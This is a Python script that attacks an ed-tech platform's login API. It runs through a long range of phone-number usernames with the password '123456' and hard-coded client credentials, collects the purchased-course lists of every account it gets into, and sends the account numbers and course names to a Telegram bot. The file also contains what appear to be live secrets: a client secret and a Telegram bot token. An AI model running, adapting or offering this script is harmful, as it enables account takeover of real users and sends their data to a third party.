import requests
import asyncio

async def get_batches_and_send_message(number):
    headers = {
        'Authorization': 'Bearer',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'client-id': '5eb393ee95fab7468a79d189',
    }
    json_data = {
        'password': '123456',
        'client_id': 'system-admin',
        'client_secret': 'KjPXuAVfC5xbmgreETNMaL7z',
        'grant_type': 'password',
        'organizationId': '5eb393ee95fab7468a79d189',
        'latitude': 0,
        'longitude': 0,
    }
    
    while number != 8000000000:
        json_data['username'] = str(number)
        response = requests.post('https://api.penpencil.co/v3/oauth/token', headers=headers, json=json_data)
        
        if response.status_code == 200:
            token = response.json()['data']['access_token']
            batches = await getBs(token)
            message = str(number) + str(batches)
            send_telegram_message(message)
        number -= 1

async def getBs(token):
    url = 'https://api.penpencil.co/v3/batches/all-purchased-batches?page=1&mode=1&sort=TAG_LIST'
    headers = {
        'Host': 'api.penpencil.co',
        'Sec-Ch-Ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
        'Authorization': f'Bearer {token}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Randomid': 'd00d2cb9-7907-42b7-b105-0972c105e171',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9'
    }

    response = requests.get(url, headers=headers)
    batches = []
    
    if response.status_code == 200:
        data = response.json()['data']
        for i in data:
            batches.append(i['batch']['name'])
    
    return batches

def send_telegram_message(message):
    telegram_url = 'https://api.telegram.org/bot6107093453:AAEwZhVbqR3VnAL-_1-9K12ijlc-7-vhaIE/sendMessage?chat_id=-838827510&text=' + message
    requests.get(telegram_url)

loop = asyncio.get_event_loop()
loop.run_until_complete(get_batches_and_send_message(8482999999))
